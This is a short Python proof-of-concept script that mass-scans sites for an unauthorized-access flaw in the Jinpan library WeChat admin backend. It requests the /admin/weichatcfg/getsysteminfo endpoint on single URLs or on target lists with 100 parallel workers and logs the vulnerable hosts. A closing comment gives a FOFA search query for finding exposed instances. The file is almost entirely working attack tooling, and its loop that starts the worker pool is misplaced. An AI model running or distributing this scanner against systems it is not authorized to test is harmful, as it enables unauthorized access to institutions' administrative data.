import argparse,requests,sys,re
from multiprocessing import Pool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings()
def banner():
    text = """金盘图书馆微信管理后台 getsysteminfo 未授权访问漏洞"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="金盘图书馆微信管理后台 getsysteminfo 未授权访问漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please enter your file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
                mp = Pool(100)
                mp.map(poc, url_list)
                mp.close()
                mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/admin/weichatcfg/getsysteminfo"
    try:
        res1 = requests.get(target+payload,verify=False,timeout=10)
        if res1.status_code == 200 and 'goldlibgdlis' in res1.text:
            print(f"[+]{target}存在未授权访问漏洞\n")
            with open('金盘图书馆未授权_result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}存在未授权访问漏洞")
        else:
            print(f"[-]{target}不存在未授权访问漏洞")
    except:
        print(f"{target}可能存在未授权访问漏洞请手工测试")
if __name__ == '__main__':
    main()
# fofa:  title="微信管理后台" && icon_hash="116323821"